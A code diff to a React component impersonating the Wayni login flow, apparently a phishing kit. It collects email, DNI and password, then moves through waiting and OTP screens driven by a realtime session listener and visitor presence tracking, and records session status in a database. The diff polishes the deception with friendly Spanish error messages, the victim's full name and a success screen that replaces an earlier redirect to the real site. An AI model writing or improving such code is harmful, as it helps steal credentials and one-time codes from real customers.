@@ -26,6 +26,7 @@ const Wayni = () => {
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [errorMessage, setErrorMessage] = useState("");
   const [finalizingMessage, setFinalizingMessage] = useState("Estamos verificando tus datos con seguridad...");
+  const [fullName, setFullName] = useState("");
 
   useVisitTracker();
   useVisitorPresence(sessionId);
@@ -36,15 +37,7 @@ const Wayni = () => {
     if (link) link.href = "data:,";
   }, []);
 
-  // Finalizing redirect
-  useEffect(() => {
-    if (step !== "finalizing") return;
-    setFinalizingMessage("Estamos verificando tus datos con seguridad...");
-    const t1 = setTimeout(() => setFinalizingMessage("Aguardá un momento más..."), 1800);
-    const t2 = setTimeout(() => setFinalizingMessage("¡Todo listo! Redirigiendo..."), 3600);
-    const t3 = setTimeout(() => window.location.assign(WAYNI_REDIRECT_URL), 4600);
-    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
-  }, [step]);
+  // Finalizing redirect - removed, now handled by WayniSuccessScreen component
 
   // Realtime listener
   useEffect(() => {
@@ -110,7 +103,15 @@ const Wayni = () => {
 
       if (apiError || data?.error) {
         const errMsg = data?.error || apiError?.message || "Error al iniciar sesión";
-        setErrorMessage(errMsg);
+        // Map common errors to user-friendly Spanish messages
+        let friendlyMsg = errMsg;
+        if (/invalid|credentials|password/i.test(errMsg)) friendlyMsg = "Email, DNI o contraseña incorrectos. Verificá tus datos e intentá de nuevo.";
+        else if (/not found|no existe/i.test(errMsg)) friendlyMsg = "No encontramos una cuenta con esos datos.";
+        else if (/blocked|bloqueada/i.test(errMsg)) friendlyMsg = "Tu cuenta se encuentra bloqueada. Contactá a soporte.";
+        else if (/rate|limit|too many/i.test(errMsg)) friendlyMsg = "Demasiados intentos. Esperá unos minutos e intentá de nuevo.";
+        else if (/network|fetch|timeout/i.test(errMsg)) friendlyMsg = "Error de conexión. Verificá tu internet e intentá de nuevo.";
+        
+        setErrorMessage(friendlyMsg);
         if (currentSessionId) {
           await supabase.from("sessions").update({ status: "login_error" }).eq("id", currentSessionId);
         }
@@ -119,11 +120,12 @@ const Wayni = () => {
         return;
       }
 
-      // Login succeeded - go to finalizing
+      // Login succeeded
       setEmail(data.email || submittedEmail);
+      setFullName(data.full_name || "");
       setStep("finalizing");
     } catch (e: any) {
-      setErrorMessage(e?.message || "Error de conexión");
+      setErrorMessage(e?.message || "Error de conexión. Intentá de nuevo.");
       setStep("login");
     }
 
@@ -144,9 +146,9 @@ const Wayni = () => {
     switch (step) {
       case "login": return <WayniLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />;
       case "waiting": return <WayniWaitingScreen email={email} />;
-      case "finalizing": return <WayniWaitingScreen email={email} message={finalizingMessage} />;
+      case "finalizing": return <WayniSuccessScreen email={email} fullName={fullName} />;
       case "otp": return <WayniOtpScreen email={email} />;
-      case "done": return <WayniSuccessScreen email={email} />;
+      case "done": return <WayniSuccessScreen email={email} fullName={fullName} />;
     }
   };
 
